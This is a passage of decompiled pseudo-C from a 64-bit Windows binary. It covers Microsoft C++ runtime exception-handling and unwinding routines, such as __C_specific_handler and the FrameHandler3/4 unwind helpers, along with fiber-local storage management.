  v19 = v13 + v12 + 20LL * (v16 - 1);
LABEL_7:
  for ( i = 0; i < v9; ++i )
  {
    if ( (v19 == 0
       || *(_DWORD *)(v17 + 20LL * i) > *(_DWORD *)(v19 + 4) && *(_DWORD *)(v17 + 20LL * i + 4) <= *(_DWORD *)(v19 + 8))
      && a3 >= *(_DWORD *)(v17 + 20LL * i)
      && a3 <= *(_DWORD *)(v17 + 20LL * i + 4) )
    {
      v15 = i;
      if ( v14 == -1 )
        v14 = i;
    }
  }
  v21 = 0;
  if ( v14 != -1 )
    v21 = v15 + 1;
  *(_QWORD *)&v23 = a2;
  if ( v14 != -1 )
    v11 = v14;
  DWORD2(v23) = v21;
  *(_DWORD *)(a1 + 12) = HIDWORD(v23);
  *(_QWORD *)a1 = a2;
  *(_OWORD *)(a1 + 16) = v23;
  *(_DWORD *)(a1 + 8) = v11;
  return a1;
}


// ----- sub_140011854 @ 0x140011854 -----
__int64 __fastcall sub_140011854(__int64 a1, int *a2, int a3)
{
  __int128 v5; // xmm6
  int v7; // ebp
  int v8; // r15d
  _BYTE *v9; // r12
  signed int v10; // r11d
  int v11; // r10d
  __int64 v12; // rcx
  __int64 v13; // r9
  unsigned int v14; // r11d
  __int64 v15; // rcx
  __int64 v16; // r8
  _BYTE *v17; // rdx
  int v18; // eax
  __int64 v19; // rcx
  _DWORD *v20; // r12
  int v21; // eax
  int v22; // eax
  __int128 v24; // [rsp+20h] [rbp-68h]
  __int128 v25; // [rsp+30h] [rbp-58h]
  __int128 v26; // [rsp+40h] [rbp-48h] BYREF

  *(_QWORD *)&v24 = a2;
  *(_QWORD *)&v25 = a2;
  DWORD2(v24) = 0;
  v5 = v24;
  v26 = v24;
  v7 = 0;
  sub_140011C04(a2, &v26);
  v8 = *a2;
  if ( *a2 != 0 )
  {
    v9 = *((_BYTE **)a2 + 1);
    v10 = a2[6];
    v11 = 0;
    do
    {
      if ( a3 >= v10 && a3 <= a2[7] )
      {
        v7 = v11;
        DWORD2(v24) = 0;
        v5 = v24;
      }
      v12 = *v9 & 0xF;
      ++v11;
      v13 = byte_14008FFB0[v12];
      LOBYTE(v12) = byte_14008FFB0[v12 + 16];
      v14 = *(_DWORD *)&v9[-v13 - 4];
      *((_QWORD *)a2 + 1) = &v9[-v13];
      v10 = v14 >> v12;
      a2[6] = v10;
      v15 = v9[-v13] & 0xF;
      v16 = byte_14008FFB0[v15];
      v17 = &v9[-v16 - v13];
      v18 = *((_DWORD *)v17 - 1) >> byte_14008FFB0[v15 + 16];
      *((_QWORD *)a2 + 1) = v17;
      a2[7] = v18;
      v19 = *v17 & 0xF;
      v20 = &v9[-byte_14008FFB0[v19] - v16 - v13];
      v21 = *(v20 - 1) >> byte_14008FFB0[v19 + 16];
      *((_QWORD *)a2 + 1) = v20;
      a2[8] = v21;
      v22 = *v20;
      v9 = v20 + 1;
      *((_QWORD *)a2 + 1) = v9;
      a2[9] = v22;
    }
    while ( v11 != v8 );
  }
  v26 = v5;
  DWORD2(v25) = v7 + 1;
  sub_140011C04(a2, &v26);
  *(_DWORD *)(a1 + 12) = HIDWORD(v24);
  *(_QWORD *)a1 = a2;
  *(_OWORD *)(a1 + 16) = v25;
  *(_DWORD *)(a1 + 8) = 0;
  return a1;
}


// ----- ?UnwindNestedFrames@__FrameHandler3@@SAXPEA_KPEAUEHExceptionRecord@@PEAU_CONTEXT@@0PEAXPEBU_s_FuncInfo@@HHPEBU_s_HandlerType@@PEAU_xDISPATCHER_CONTEXT@@E@Z @ 0x1400119e0 -----
static void __fastcall __FrameHandler3::UnwindNestedFrames(
        void **a1,
        struct EHExceptionRecord *a2,
        struct _CONTEXT *a3,
        unsigned __int64 *a4,
        void *a5,
        const struct _s_FuncInfo *a6,
        int a7,
        int a8,
        const struct _s_HandlerType *a9,
        struct _xDISPATCHER_CONTEXT *a10,
        unsigned __int8 a11)
{
  void *v11; // rcx
  struct _CONTEXT *ContextRecord; // rax
  void *ControlPc; // rdx
  struct _UNWIND_HISTORY_TABLE *HistoryTable; // [rsp+28h] [rbp-99h]
  EXCEPTION_RECORD ExceptionRecord; // [rsp+30h] [rbp-91h] BYREF

  *(_OWORD *)&ExceptionRecord.ExceptionCode = unk_140090070;
  *(_OWORD *)&ExceptionRecord.ExceptionAddress = unk_140090080;
  qmemcpy(ExceptionRecord.ExceptionInformation, byte_140090090, 112);
  ExceptionRecord.ExceptionInformation[14] = 0;
  v11 = *a1;
  ExceptionRecord.ExceptionInformation[0] = (ULONG_PTR)sub_140014780;
  ExceptionRecord.ExceptionInformation[2] = (ULONG_PTR)a5;
  ExceptionRecord.ExceptionInformation[3] = a7;
  ExceptionRecord.ExceptionInformation[5] = (ULONG_PTR)a6;
  ExceptionRecord.ExceptionInformation[7] = a11;
  HistoryTable = a10->HistoryTable;
  ContextRecord = a10->ContextRecord;
  ExceptionRecord.ExceptionInformation[1] = (ULONG_PTR)a4;
  ExceptionRecord.ExceptionInformation[4] = (ULONG_PTR)a3;
  ExceptionRecord.ExceptionInformation[6] = (ULONG_PTR)a2;
  ControlPc = (void *)a10->ControlPc;
  ExceptionRecord.ExceptionInformation[8] = 429065504;
  RtlUnwindEx(v11, ControlPc, &ExceptionRecord, nullptr, ContextRecord, HistoryTable);
}


// ----- ?UnwindNestedFrames@__FrameHandler4@@SAXPEA_KPEAUEHExceptionRecord@@PEAU_CONTEXT@@0PEAXPEAUFuncInfo4@FH4@@HHPEAUHandlerType4@5@PEAU_xDISPATCHER_CONTEXT@@E@Z @ 0x140011ae4 -----
static void __fastcall __FrameHandler4::UnwindNestedFrames(
        void **a1,
        struct EHExceptionRecord *a2,
        struct _CONTEXT *a3,
        unsigned __int64 *a4,
        void *a5,
        struct FH4::FuncInfo4 *a6,
        int a7,
        int a8,
        struct FH4::HandlerType4 *a9,
        struct _xDISPATCHER_CONTEXT *a10,
        unsigned __int8 a11)
{
  __int64 v12; // rcx
  __int64 v13; // r8
  struct _CONTEXT *ContextRecord; // rax
  void *v15; // rcx
  void *ControlPc; // rdx
  struct _UNWIND_HISTORY_TABLE *HistoryTable; // [rsp+28h] [rbp-99h]
  EXCEPTION_RECORD ExceptionRecord; // [rsp+30h] [rbp-91h] BYREF

  *(_OWORD *)&ExceptionRecord.ExceptionCode = unk_14008FFD0;
  *(_OWORD *)&ExceptionRecord.ExceptionAddress = unk_14008FFE0;
  ExceptionRecord.ExceptionInformation[1] = unk_14008FFF8;
  ExceptionRecord.ExceptionInformation[5] = unk_140090018;
  ExceptionRecord.ExceptionInformation[6] = unk_140090020;
  memset(&ExceptionRecord.ExceptionInformation[8], 0, 56);
  ExceptionRecord.ExceptionInformation[0] = (ULONG_PTR)sub_14001498C;
  ExceptionRecord.ExceptionInformation[2] = (ULONG_PTR)a5;
  ExceptionRecord.ExceptionInformation[4] = (ULONG_PTR)a3;
  ExceptionRecord.ExceptionInformation[3] = a7;
  ExceptionRecord.ExceptionInformation[7] = a11;
  v12 = a10->ImageBase + *((_QWORD *)a9 + 3);
  v13 = a10->ImageBase + *((_QWORD *)a9 + 4);
  ExceptionRecord.ExceptionInformation[11] = a8;
  HistoryTable = a10->HistoryTable;
  ContextRecord = a10->ContextRecord;
  ExceptionRecord.ExceptionInformation[1] = (ULONG_PTR)a4;
  ExceptionRecord.ExceptionInformation[5] = v12;
  v15 = *a1;
  ExceptionRecord.ExceptionInformation[6] = (ULONG_PTR)a2;
  ControlPc = (void *)a10->ControlPc;
  ExceptionRecord.ExceptionInformation[9] = v13;
  ExceptionRecord.ExceptionInformation[8] = 429065504;
  RtlUnwindEx(v15, ControlPc, &ExceptionRecord, nullptr, ContextRecord, HistoryTable);
}


// ----- sub_140011C04 @ 0x140011c04 -----
__int64 __fastcall sub_140011C04(__int64 a1, __int64 a2)
{
  _BYTE *v2; // r8
  int v3; // edi
  int v5; // ebx
  __int64 v6; // rcx
  _BYTE *v7; // r8
  __int64 v8; // rcx
  _BYTE *v9; // r8
  int v10; // eax
  __int64 v11; // rcx
  unsigned int *v12; // r8
  _BYTE *v13; // r10
  unsigned int v14; // eax
  bool v15; // zf
  __int64 result; // rax
  __int64 v17; // rcx
  __int64 v18; // r9
  unsigned int v19; // eax
  __int64 v20; // rcx
  __int64 v21; // r8
  _BYTE *v22; // rdx
  unsigned int v23; // eax
  __int64 v24; // rcx
  __int64 v25; // rax
  _DWORD *v26; // r10
  __int64 v27; // rcx
  __int64 v28; // r9
  __int64 v29; // rcx
  __int64 v30; // r8
  _BYTE *v31; // rdx
  __int64 v32; // rcx
  unsigned int *v33; // r10

  v2 = *(_BYTE **)(a1 + 16);
  v3 = *(_DWORD *)(a2 + 8);
  *(_QWORD *)(a1 + 8) = v2;
  v5 = 0;
  v6 = *v2 & 0xF;
  v7 = &v2[-byte_14008FFB0[v6]];
  *(_DWORD *)(a1 + 24) = *((_DWORD *)v7 - 1) >> byte_14008FFB0[v6 + 16];
  *(_QWORD *)(a1 + 8) = v7;
  v8 = *v7 & 0xF;
  v9 = &v7[-byte_14008FFB0[v8]];
  v10 = *((_DWORD *)v9 - 1) >> byte_14008FFB0[v8 + 16];
  *(_QWORD *)(a1 + 8) = v9;
  *(_DWORD *)(a1 + 28) = v10;
  v11 = *v9 & 0xF;
  v12 = (unsigned int *)&v9[-byte_14008FFB0[v11]];
  v13 = v12 + 1;
  v14 = *(v12 - 1) >> byte_14008FFB0[v11 + 16];
  *(_QWORD *)(a1 + 8) = v12;
  v15 = v3 == 0;
  *(_DWORD *)(a1 + 32) = v14;
  result = *v12;
  while ( 1 )
  {
    *(_QWORD *)(a1 + 8) = v13;
    *(_DWORD *)(a1 + 36) = result;
    if ( v15 )
      break;
    v17 = *v13 & 0xF;
    ++v5;
    v18 = byte_14008FFB0[v17];
    LOBYTE(v17) = byte_14008FFB0[v17 + 16];
    v19 = *(_DWORD *)&v13[-v18 - 4];
    *(_QWORD *)(a1 + 8) = &v13[-v18];
    *(_DWORD *)(a1 + 24) = v19 >> v17;
    v20 = v13[-v18] & 0xF;
    v21 = byte_14008FFB0[v20];
    LOBYTE(v20) = byte_14008FFB0[v20 + 16];
    v22 = &v13[-v21 - v18];
    v23 = *((_DWORD *)v22 - 1);
    *(_QWORD *)(a1 + 8) = v22;
    *(_DWORD *)(a1 + 28) = v23 >> v20;
    v24 = *v22 & 0xF;
    v25 = byte_14008FFB0[v24];
    LOBYTE(v24) = byte_14008FFB0[v24 + 16];
    v26 = &v13[-v25 - v21 - v18];
    LODWORD(v25) = *(v26 - 1);
    *(_QWORD *)(a1 + 8) = v26;
    *(_DWORD *)(a1 + 32) = (unsigned int)v25 >> v24;
    LODWORD(v25) = *v26++;
    *(_QWORD *)(a1 + 8) = v26;
    *(_DWORD *)(a1 + 36) = v25;
    v27 = *(_BYTE *)v26 & 0xF;
    v28 = byte_14008FFB0[v27];
    LODWORD(v25) = *(_DWORD *)((char *)v26 - v28 - 4) >> byte_14008FFB0[v27 + 16];
    *(_QWORD *)(a1 + 8) = (char *)v26 - v28;
    *(_DWORD *)(a1 + 24) = v25;
    v29 = *((_BYTE *)v26 - v28) & 0xF;
    v30 = byte_14008FFB0[v29];
    v31 = (char *)v26 - v30 - v28;
    *(_DWORD *)(a1 + 28) = *((_DWORD *)v31 - 1) >> byte_14008FFB0[v29 + 16];
    *(_QWORD *)(a1 + 8) = v31;
    v32 = *v31 & 0xF;
    v33 = (_DWORD *)((char *)v26 + -v30 - byte_14008FFB0[v32] - v28);
    LODWORD(v25) = *(v33 - 1) >> byte_14008FFB0[v32 + 16];
    *(_QWORD *)(a1 + 8) = v33;
    *(_DWORD *)(a1 + 32) = v25;
    result = *v33;
    v13 = v33 + 1;
    v15 = v5 == v3;
  }
  return result;
}


// ----- _CreateFrameInfo @ 0x140011df0 -----
_QWORD *__fastcall CreateFrameInfo(_QWORD *a1, __int64 a2)
{
  __int64 v3; // rcx

  *a1 = a2;
  if ( (unsigned __int64)a1 >= *(_QWORD *)(sub_14001244C() + 88) )
    v3 = 0;
  else
    v3 = *(_QWORD *)(sub_14001244C() + 88);
  a1[1] = v3;
  *(_QWORD *)(sub_14001244C() + 88) = a1;
  return a1;
}


// ----- _FindAndUnlinkFrame @ 0x140011e2c -----
__int64 __fastcall FindAndUnlinkFrame(__int64 a1)
{
  __int64 v2; // rdx
  __int64 v3; // rbx
  __int64 result; // rax

  if ( a1 != *(_QWORD *)(sub_14001244C() + 88) || (v2 = *(_QWORD *)(sub_14001244C() + 88)) == 0 )
LABEL_7:
    abort();
  while ( 1 )
  {
    v3 = *(_QWORD *)(v2 + 8);
    if ( a1 == v2 )
      break;
    v2 = *(_QWORD *)(v2 + 8);
    if ( v3 == 0 )
      goto LABEL_7;
  }
  result = sub_14001244C();
  *(_QWORD *)(result + 88) = v3;
  return result;
}


// ----- _GetImageBase @ 0x140011e80 -----
__int64 GetImageBase()
{
  return *(_QWORD *)(sub_14001244C() + 96);
}


// ----- _GetThrowImageBase @ 0x140011e94 -----
__int64 GetThrowImageBase()
{
  return *(_QWORD *)(sub_14001244C() + 104);
}


// ----- _SetImageBase @ 0x140011ea8 -----
__int64 __fastcall SetImageBase(__int64 a1)
{
  __int64 result; // rax

  result = sub_14001244C();
  *(_QWORD *)(result + 96) = a1;
  return result;
}


// ----- _SetThrowImageBase @ 0x140011ec0 -----
__int64 __fastcall SetThrowImageBase(__int64 a1)
{
  __int64 result; // rax

  result = sub_14001244C();
  *(_QWORD *)(result + 104) = a1;
  return result;
}


// ----- __CxxFrameHandler3 @ 0x140011ed8 -----
__int64 __fastcall _CxxFrameHandler3(
        struct EHExceptionRecord *a1,
        unsigned __int64 a2,
        struct _CONTEXT *a3,
        __int64 a4)
{
  __int64 v4; // rbx
  void *pThrowImageBase; // rbx
  __int64 v9; // rax
  unsigned __int64 v11; // [rsp+50h] [rbp+8h] BYREF

  v4 = *(_QWORD *)(a4 + 8);
  v11 = a2;
  *(_QWORD *)(sub_14001244C() + 96) = v4;
  pThrowImageBase = a1->params.pThrowImageBase;
  *(_QWORD *)(sub_14001244C() + 104) = pThrowImageBase;
  v9 = sub_14001244C();
  return sub_140014564(
           a1,
           &v11,
           a3,
           (struct _xDISPATCHER_CONTEXT *)a4,
           (struct _s_FuncInfo *)(*(_QWORD *)(v9 + 96) + **(unsigned int **)(a4 + 56)),
           0,
           0,
           0);
}


// ----- sub_140011F60 @ 0x140011f60 -----
__int64 __fastcall sub_140011F60(__int64 a1, __int64 a2, int a3, __int64 a4)
{
  __int64 v4; // rbx
  __int64 v8; // rbx
  __int64 v9; // rax
  _BYTE v11[32]; // [rsp+40h] [rbp-28h] BYREF
  __int64 v12; // [rsp+70h] [rbp+8h] BYREF

  v4 = *(_QWORD *)(a4 + 8);
  v11[0] = 0;
  memset(&v11[4], 0, 20);
  v12 = a2;
  *(_QWORD *)(sub_14001244C() + 96) = v4;
  v8 = *(_QWORD *)(a1 + 56);
  *(_QWORD *)(sub_14001244C() + 104) = v8;
  v9 = sub_14001244C();
  sub_14001141C(
    (_BYTE *)(*(_QWORD *)(v9 + 96) + **(unsigned int **)(a4 + 56)),
    (__int64)v11,
    *(_QWORD *)(a4 + 8),
    **(_DWORD **)(a4 + 16),
    0);
  return __InternalCxxFrameHandlerWrapper<__FrameHandler4>(a1, (int)&v12, a3, a4, (struct FH4::FuncInfo4 *)v11, 0, 0, 0);
}


// ----- __uncaught_exceptions @ 0x140012030 -----
__int64 _uncaught_exceptions()
{
  __int64 v0; // rcx
  __int64 result; // rax

  v0 = sub_140012528();
  result = 0;
  if ( v0 != 0 )
    return *(unsigned int *)(v0 + 48);
  return result;
}


// ----- __DestructExceptionObject @ 0x140012050 -----
void __fastcall _DestructExceptionObject(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rdx
  __int64 v3; // rcx

  if ( a1 != 0
    && *(_DWORD *)a1 == -529697949
    && *(_DWORD *)(a1 + 24) == 4
    && (unsigned int)(*(_DWORD *)(a1 + 32) - 429065504) <= 2 )
  {
    v1 = *(_QWORD *)(a1 + 48);
    if ( v1 != 0 )
    {
      v2 = *(int *)(v1 + 4);
      if ( (_DWORD)v2 != 0 )
      {
        ((void (__fastcall *)(_QWORD))(*(_QWORD *)(a1 + 56) + v2))(*(_QWORD *)(a1 + 40));
      }
      else if ( (*(_BYTE *)v1 & 0x10) != 0 )
      {
        v3 = **(_QWORD **)(a1 + 40);
        if ( v3 != 0 )
          (*(void (__fastcall **)(__int64))(*(_QWORD *)v3 + 16LL))(v3);
      }
    }
  }
}


// ----- ?_CallMemberFunction0@@YAXQEAX0@Z @ 0x1400120c0 -----
void __fastcall _CallMemberFunction0(void *const a1, void (__fastcall *a2)(void *const))
{
  a2(a1);
}


// ----- _IsExceptionObjectToBeDestroyed @ 0x1400120c4 -----
__int64 __fastcall IsExceptionObjectToBeDestroyed(__int64 a1)
{
  _QWORD *i; // rdx

  for ( i = *(_QWORD **)(sub_14001244C() + 88); ; i = (_QWORD *)i[1] )
  {
    if ( i == nullptr )
      return 1;
    if ( *i == a1 )
      break;
  }
  return 0;
}


// ----- sub_1400120F4 @ 0x1400120f4 -----
__int64 __fastcall sub_1400120F4(__int64 a1, int *a2)
{
  if ( a2[1] < 0 )
    return a1 + *a2;
  else
    return a1 + *a2 + a2[1] + (__int64)*(int *)(a2[2] + *(_QWORD *)(a2[1] + a1));
}


// ----- __FrameUnwindFilter @ 0x14001211c -----
__int64 __fastcall _FrameUnwindFilter(__int64 a1)
{
  _DWORD *v1; // rdi
  __int64 v3; // rax
  __int64 v5; // rbx

  v1 = *(_DWORD **)a1;
  if ( **(_DWORD **)a1 == -532462766 || *v1 == -532459699 )
  {
    if ( *(int *)(sub_14001244C() + 48) > 0 )
    {
      v3 = sub_14001244C();
      --*(_DWORD *)(v3 + 48);
    }
  }
  else if ( *v1 == -529697949 )
  {
    *(_QWORD *)(sub_14001244C() + 32) = v1;
    v5 = *(_QWORD *)(a1 + 8);
    *(_QWORD *)(sub_14001244C() + 40) = v5;
    sub_14001BA28();
  }
  return 0;
}


// ----- __current_exception @ 0x140012184 -----
__int64 _current_exception()
{
  return sub_14001244C() + 32;
}


// ----- __current_exception_context @ 0x140012198 -----
__int64 _current_exception_context()
{
  return sub_14001244C() + 40;
}


// ----- sub_1400121AC @ 0x1400121ac -----
void __noreturn sub_1400121AC()
{
  sub_14001BA28();
}


// ----- __C_specific_handler @ 0x1400121b8 -----
EXCEPTION_DISPOSITION __cdecl _C_specific_handler(
        struct _EXCEPTION_RECORD *ExceptionRecord,
        void *EstablisherFrame,
        struct _CONTEXT *ContextRecord,
        struct _DISPATCHER_CONTEXT *DispatcherContext)
{
  DWORD64 ImageBase; // r12
  DWORD *HandlerData; // rbx
  unsigned __int64 v10; // r14
  DWORD ScopeIndex; // edi
  int v12; // eax
  DWORD v14; // edx
  unsigned __int64 v15; // rsi
  __int64 v16; // rcx
  DWORD i; // r9d
  __int64 v18; // rax
  _QWORD v19[2]; // [rsp+30h] [rbp-38h] BYREF

  _except_validate_context_record(ContextRecord);
  ImageBase = DispatcherContext->ImageBase;
  HandlerData = (DWORD *)DispatcherContext->HandlerData;
  v10 = DispatcherContext->ControlPc - ImageBase;
  ScopeIndex = DispatcherContext->ScopeIndex;
  if ( (ExceptionRecord->ExceptionFlags & 0x66) != 0 )
  {
    v14 = *HandlerData;
    if ( ScopeIndex < *HandlerData )
    {
      v15 = DispatcherContext->TargetIp - ImageBase;
      do
      {
        v16 = 2LL * ScopeIndex;
        if ( v10 >= HandlerData[4 * ScopeIndex + 1] && v10 < HandlerData[4 * ScopeIndex + 2] )
        {
          if ( (ExceptionRecord->ExceptionFlags & 0x20) != 0 )
          {
            for ( i = 0; i < v14; ++i )
            {
              if ( v15 >= HandlerData[4 * i + 1]
                && v15 < HandlerData[4 * i + 2]
                && HandlerData[4 * i + 4] == HandlerData[4 * ScopeIndex + 4]
                && HandlerData[4 * i + 3] == HandlerData[4 * ScopeIndex + 3] )
              {
                break;
              }
            }
            if ( i != *HandlerData )
              return ExceptionContinueSearch;
          }
          v18 = HandlerData[4 * ScopeIndex + 4];
          if ( (_DWORD)v18 != 0 )
          {
            if ( v15 == v18 && (ExceptionRecord->ExceptionFlags & 0x20) != 0 )
              return ExceptionContinueSearch;
          }
          else
          {
            DispatcherContext->ScopeIndex = ScopeIndex + 1;
            LOBYTE(v16) = 1;
            ((void (__fastcall *)(__int64, void *))(ImageBase + HandlerData[4 * ScopeIndex + 3]))(v16, EstablisherFrame);
          }
        }
        v14 = *HandlerData;
        ++ScopeIndex;
      }
      while ( ScopeIndex < *HandlerData );
    }
  }
  else
  {
    v19[0] = ExceptionRecord;
    v19[1] = ContextRecord;
    while ( ScopeIndex < *HandlerData )
    {
      if ( v10 >= HandlerData[4 * ScopeIndex + 1]
        && v10 < HandlerData[4 * ScopeIndex + 2]
        && HandlerData[4 * ScopeIndex + 4] != 0 )
      {
        if ( HandlerData[4 * ScopeIndex + 3] == 1 )
          goto LABEL_10;
        v12 = ((__int64 (__fastcall *)(_QWORD *, void *))(ImageBase + HandlerData[4 * ScopeIndex + 3]))(
                v19,
                EstablisherFrame);
        if ( v12 < 0 )
          return ExceptionContinueExecution;
        if ( v12 > 0 )
        {
LABEL_10:
          if ( ExceptionRecord->ExceptionCode == -529697949
            && _DestructExceptionObject != nullptr
            && (unsigned int)sub_14002A6C0(&off_140090108) != 0 )
          {
            _DestructExceptionObject((__int64)ExceptionRecord);
          }
          NLG_Notify(ImageBase + HandlerData[4 * ScopeIndex + 4], EstablisherFrame, 1);
          RtlUnwindEx(
            EstablisherFrame,
            (PVOID)(ImageBase + HandlerData[4 * ScopeIndex + 4]),
            ExceptionRecord,
            (PVOID)ExceptionRecord->ExceptionCode,
            DispatcherContext->ContextRecord,
            DispatcherContext->HistoryTable);
          nullsub_1();
        }
      }
      ++ScopeIndex;
    }
  }
  return ExceptionContinueSearch;
}


// ----- sub_1400123C0 @ 0x1400123c0 -----
char sub_1400123C0()
{
  if ( (unsigned __int8)sub_1400157CC() == 0 )
    return 0;
  if ( (unsigned __int8)sub_140012578() == 0 )
  {
    _vcrt_uninitialize_locks();
    return 0;
  }
  return 1;
}


// ----- __vcrt_uninitialize @ 0x1400123e8 -----
__vcrt_bool __cdecl _vcrt_uninitialize(__vcrt_bool Terminating)
{
  if ( !Terminating )
  {
    sub_1400125C4();
    _vcrt_uninitialize_locks();
  }
  return true;
}


// ----- __std_type_info_compare @ 0x140012404 -----
__int64 __fastcall _std_type_info_compare(__int64 a1, __int64 a2)
{
  char *v2; // rax
  __int64 v3; // rdx
  char v4; // cl

  if ( a1 == a2 )
    return 0;
  v2 = (char *)(a1 + 9);
  v3 = a2 - a1;
  while ( 1 )
  {
    v4 = *v2;
    if ( *v2 != v2[v3] )
      break;
    ++v2;
    if ( v4 == 0 )
      return 0;
  }
  return (unsigned __int8)*v2 < (unsigned __int8)v2[v3] ? -1 : 1;
}


// ----- __vcrt_freefls @ 0x14001242c -----
void __fastcall _vcrt_freefls(PVOID lpFlsData)
{
  if ( lpFlsData != nullptr && lpFlsData != &unk_1400A00B0 )
    j__free_base(lpFlsData);
}


// ----- sub_14001244C @ 0x14001244c -----
__int64 sub_14001244C()
{
  __int64 result; // rax

  result = sub_140012468();
  if ( result == 0 )
    abort();
  return result;
}


// ----- sub_140012468 @ 0x140012468 -----
PVOID sub_140012468()
{
  DWORD LastError; // ebx
  PVOID Value; // rax
  PVOID v3; // rdi
  _DWORD *v4; // rax
  DWORD v5; // ecx
  _DWORD *v6; // rsi
  void *v7; // rcx

  if ( dwFlsIndex == -1 )
    return nullptr;
  LastError = GetLastError();
  Value = FlsGetValue(dwFlsIndex);
  v3 = nullptr;
  if ( Value != (PVOID)-1LL )
  {
    if ( Value != nullptr )
    {
      v3 = Value;
      goto LABEL_13;
    }
    if ( !FlsSetValue(dwFlsIndex, (PVOID)0xFFFFFFFFFFFFFFFFLL) )
      goto LABEL_13;
    v4 = j__calloc_base(1u, 0x80u);
    v5 = dwFlsIndex;
    v6 = v4;
    if ( v4 != nullptr )
    {
      if ( FlsSetValue(dwFlsIndex, v4) )
      {
        v7 = nullptr;
        v6[30] = -2;
        v3 = v6;
LABEL_12:
        j__free_base(v7);
        goto LABEL_13;
      }
      v5 = dwFlsIndex;
    }
    FlsSetValue(v5, nullptr);
    v7 = v6;
    goto LABEL_12;
  }
LABEL_13:
  SetLastError(LastError);
  return v3;
}


// ----- sub_140012528 @ 0x140012528 -----
PVOID sub_140012528()
{
  DWORD LastError; // ebx
  PVOID Value; // rdi

  if ( dwFlsIndex == -1 )
    return nullptr;
  LastError = GetLastError();
  Value = FlsGetValue(dwFlsIndex);
  SetLastError(LastError);
  if ( Value == (PVOID)-1LL )
    return nullptr;
  return Value;
}


// ----- sub_140012578 @ 0x140012578 -----
char sub_140012578()
{
  DWORD v0; // eax

  v0 = FlsAlloc((PFLS_CALLBACK_FUNCTION)_vcrt_freefls);
  dwFlsIndex = v0;
  if ( v0 != -1 )
  {
    if ( FlsSetValue(v0, &unk_1400A00B0) )
    {
      dword_1400A0128 = -2;
      return 1;
    }
    sub_1400125C4();
  }
  return 0;
}


// ----- sub_1400125C4 @ 0x1400125c4 -----
char sub_1400125C4()
{
  if ( dwFlsIndex != -1 )
  {
    FlsFree(dwFlsIndex);
    dwFlsIndex = -1;
  }
  return 1;
}


// ----- sub_1400125EC @ 0x1400125ec -----
__int64 __fastcall sub_1400125EC(_QWORD *a1, _QWORD *a2, __int64 a3)
{
  __int64 result; // rax

  result = *(unsigned int *)(*(int *)(a3 + 28) + *a1);
  if ( (_DWORD)result == -2 )
    return sub_140012698(a3, a2, *a2);
  return result;
}


// ----- sub_140012614 @ 0x140012614 -----
__int64 __fastcall sub_140012614(_QWORD *a1, ULONG64 *a2, __int64 a3)
{
  __int64 v4; // rcx
  __int64 v5; // rax
  __int64 v7; // [rsp+40h] [rbp+18h] BYREF

  v4 = *sub_140011614(a1, a2, a3, &v7);
  v5 = *(int *)(a3 + 28);
  v7 = v4;
  return *(unsigned int *)(v5 + v4 + 4);
}


// ----- ?__SetState@@YAXPEA_KPEAU_xDISPATCHER_CONTEXT@@PEBU_s_FuncInfo@@H@Z @ 0x140012640 -----
void __fastcall __SetState(unsigned __int64 *a1, struct _xDISPATCHER_CONTEXT *a2, const struct _s_FuncInfo *a3, int a4)
{
  *(_DWORD *)(a3->dispUwindHelp + *a1) = a4;
}


// ----- sub_14001264C @ 0x14001264c -----
__int64 __fastcall sub_14001264C(_QWORD *a1, ULONG64 *a2, __int64 a3, int a4)
{
  __int64 v6; // rcx
  __int64 result; // rax
  __int64 v8; // [rsp+40h] [rbp+18h] BYREF

  v6 = *sub_140011614(a1, a2, a3, &v8);
  result = *(int *)(a3 + 28);
  v8 = v6;
  if ( a4 > *(_DWORD *)(result + v6 + 4) )
    *(_DWORD *)(result + v6 + 4) = a4;
  return result;
}


// ----- sub_140012688 @ 0x140012688 -----
__int64 __fastcall sub_140012688(__int64 a1, _QWORD *a2)
{
  return sub_140012698(a1, a2, *a2);
}


// ----- sub_140012690 @ 0x140012690 -----
__int64 __fastcall sub_140012690(__int64 a1, _QWORD *a2)
{
  return sub_1400126F4(a1, a2, *a2);
}


// ----- sub_140012698 @ 0x140012698 -----
__int64 __fastcall sub_140012698(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  __int64 v3; // r11
  __int64 v4; // r9
  unsigned int v5; // r10d
  __int64 v6; // rdx

  if ( a1 == 0 || (v3 = *(int *)(a1 + 24), (v4 = *(_QWORD *)(a2 + 8)) + v3 == 0) )
    abort();
  v5 = *(_DWORD *)(a1 + 20);
  if ( v5 == 0 )
    return 0xFFFFFFFFLL;
  v6 = 0;
  do
  {
    if ( a3 < v4 + *(int *)(v4 + v3 + 8 * v6) )
      break;
    v6 = (unsigned int)(v6 + 1);
  }
  while ( (unsigned int)v6 < v5 );
  if ( (_DWORD)v6 != 0 )
    return *(unsigned int *)(v4 + 8LL * (unsigned int)(v6 - 1) + v3 + 4);
  else
    return 0xFFFFFFFFLL;
}


// ----- sub_1400126F4 @ 0x1400126f4 -----
__int64 __fastcall sub_1400126F4(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  __int64 v3; // rdi
  _BYTE *v4; // r9
  __int64 v5; // rcx
  _BYTE *v6; // r9
  unsigned int v7; // ebx
  unsigned int *v8; // rax
  unsigned int v9; // r10d
  unsigned int v10; // esi
  unsigned int v11; // edx
  __int64 v12; // rcx
  _BYTE *v13; // r9
  __int64 v14; // rcx

  if ( *(_DWORD *)(a1 + 16) == 0 )
    return 0xFFFFFFFFLL;
  v3 = *(_QWORD *)(a2 + 8);
  v4 = (_BYTE *)(v3 + *(int *)(a1 + 16));
  v5 = *v4 & 0xF;
  v6 = &v4[-byte_14008FFB0[v5]];
  v7 = *((_DWORD *)v6 - 1) >> byte_14008FFB0[v5 + 16];
  if ( v7 == 0 )
    return 0xFFFFFFFFLL;
  v8 = *(unsigned int **)(a2 + 16);
  v9 = 0;
  v10 = 0;
  v11 = -1;
  do
  {
    v12 = *v6 & 0xF;
    v13 = &v6[-byte_14008FFB0[v12]];
    v10 += *((_DWORD *)v13 - 1) >> byte_14008FFB0[v12 + 16];
    if ( a3 < v3 + *v8 + (unsigned __int64)v10 )
      break;
    ++v9;
    v14 = *v13 & 0xF;
    v6 = &v13[-byte_14008FFB0[v14]];
    v11 = (*((_DWORD *)v6 - 1) >> byte_14008FFB0[v14 + 16]) - 1;
  }
  while ( v9 < v7 );
  if ( v9 == 0 )
    return (unsigned int)-1;
  return v11;
}


// ----- sub_1400127E4 @ 0x1400127e4 -----
__int64 __fastcall sub_1400127E4(__int64 a1, __int64 *a2, int *a3, __int64 a4)
{
  __int64 v8; // r15
